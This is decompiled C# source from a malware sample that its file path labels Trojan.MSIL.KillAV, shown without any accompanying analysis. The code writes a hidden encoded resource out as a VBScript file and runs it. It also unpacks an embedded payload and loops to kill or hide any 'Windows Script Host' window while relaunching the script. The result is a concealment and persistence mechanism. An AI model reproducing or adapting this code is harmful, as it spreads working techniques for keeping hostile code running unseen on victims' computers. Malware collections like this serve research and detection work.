// Decompiled with JetBrains decompiler
// Type: n.A
// Assembly: p, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 91D63E37-42E0-404C-97F4-07116ACD2D57
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.KillAV.ao-27eafab1bfbe5012a9dd5eb6a22a5e09a25b91a1b79c55ba29e0e7098dcc6f9f.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace n
{
  public class A
  {
    [AccessedThroughProperty("B")]
    private BackgroundWorker _B;
    public static Process fj = new Process();
    private string u;
    private string z;

    public A()
    {
      this.B = new BackgroundWorker();
      this.u = Application.StartupPath + "\\" + Process.GetCurrentProcess().Id.ToString() + ".vbs";
      string q = n.My.Resources.Resources.Q;
      this.z = API.DEB(ref q).Replace("NJP", Application.ExecutablePath).Replace("NJF", Conversions.ToString(Process.GetCurrentProcess().Id));
    }

    public virtual BackgroundWorker B
    {
      get => this._B;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = (DoWorkEventHandler) ((a0, a1) => this.D());
        if (this._B != null)
          this._B.DoWork -= workEventHandler;
        this._B = value;
        if (this._B == null)
          return;
        this._B.DoWork += workEventHandler;
      }
    }

    public void D()
    {
      byte[] B = (byte[]) new ResourceManager("nv.Resources", Assembly.LoadFile(Application.ExecutablePath)).GetObject("P");
      bool flag = false;
      ref bool local1 = ref flag;
      byte[] numArray = API.ZIP(B, ref local1);
label_1:
      try
      {
        File.WriteAllText(this.u, this.z);
        A.fj.StartInfo.FileName = this.u;
        A.fj.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_4:
      try
      {
        ref byte[] local2 = ref numArray;
        string str1 = "P.V";
        ref string local3 = ref str1;
        string str2 = "FWD";
        ref string local4 = ref str2;
        object obj1 = (object) new object[1]
        {
          (object) "Windows Script Host"
        };
        ref object local5 = ref obj1;
        int integer = Conversions.ToInteger(C.inv(ref local2, ref local3, ref local4, ref local5));
        ref byte[] local6 = ref numArray;
        string str3 = "P.V";
        ref string local7 = ref str3;
        string str4 = "Iswd";
        ref string local8 = ref str4;
        object obj2 = (object) new object[1]
        {
          (object) integer
        };
        ref object local9 = ref obj2;
        if (Operators.ConditionalCompareObjectEqual(C.inv(ref local6, ref local7, ref local8, ref local9), (object) 1, false))
        {
          try
          {
            A.fj.Kill();
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            try
            {
              API.wd.ShowWindow(integer, 0);
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(100);
      try
      {
        if (!A.fj.WaitForExit(100))
          goto label_4;
        else
          goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
